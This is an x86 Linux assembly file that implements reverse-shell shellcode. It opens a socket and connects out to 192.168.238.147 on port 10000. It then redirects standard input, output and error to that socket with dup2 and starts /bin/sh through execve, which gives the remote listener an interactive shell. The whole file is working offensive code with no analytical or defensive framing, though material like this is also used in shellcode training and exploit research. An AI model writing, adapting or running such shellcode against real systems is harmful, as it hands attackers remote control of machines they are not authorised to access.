global _start
section .text
_start:

xor ecx,ecx
mul ecx
xor ebx,ebx

;socket(AF_INET, SOCK_STREAM, 0)
; eax     ebx       ecx      edx
createSocket:
mov ax,359 ; socket system call
mov bl,2   ; AF_INET
mov cl,1   ; SOCK_STREAM
int 0x80


;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
;    eax         ebx                            ecx            edx
createConnect:
xor ebx,ebx
mov ebx,eax ; sockfd is moved to register ebx
xor eax,eax ; xored eax
push eax
push eax

; pushed 192.168.238.147
push word 0x93EE ; pushed 147.238
push word 0xA8C0 ; pushed 168.192

push word 0x1027 ;pushed port number htons(10000) on stack
push word 0x2 ; pushed AF_INET
mov ecx, esp ; moved  address of sockaddr
mov dl, 16 ; moved addr len to dl
mov ax,362 ; connect system call
int 0x80
add esp, 16 
mov edi, ebx ; moved sockfd to edi

;int dup2(int oldfd, int newfd);
xor ecx,ecx
mul ecx
xor ebx,ebx

CloneDescriptors:
mov al, 63 ; dup2 system call
mov ebx,edi ; copied sockfd to ebx
xor ecx, ecx ; standard input file descriptor
int 0x80


xor ecx,ecx
mul ecx
xor ebx,ebx
;int dup2(int oldfd, int newfd);
mov al, 63 ; dup2 system call
mov ebx ,edi
mov cl, 1 ; standard output file descriptor
int 0x80

xor ecx,ecx
mul ecx
xor ebx,ebx
;int dup2(int oldfd, int newfd);
mov al, 63 ; dup2 system call
mov ebx, edi ; standard error file desciptor(2)
mov cl, 2 ; copied sockfd to cl
int 0x80


;execve("/bin//sh")
Execve:
xor eax,eax
push eax
mov al,11 ; execve system call
push 0x68732f2f ;hs//
push 0x6e69622f ;nib/
mov ebx, esp
xor ecx,ecx
push ecx
push ebx
mov ecx, esp
xor edx,edx
int 0x80
